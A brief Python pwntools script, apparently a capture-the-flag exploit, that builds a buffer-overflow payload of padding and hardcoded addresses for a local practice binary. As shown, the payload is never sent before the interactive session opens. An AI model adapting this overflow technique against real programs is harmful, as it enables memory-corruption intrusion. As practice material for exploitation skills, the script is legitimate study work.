from pwn import *

p = process('./task_challenge1')

buf_addr = 0x6010C0
sys_addr = 0x6011E8
payload = (('A' * 0x10 + p64(sys_addr) + 'A' * 0x70 + p64(buf_addr)).ljust(0xD8, 'A') + p64(buf_addr)).ljust(0x100, 'A') + p64(buf_addr)

p.interactive()
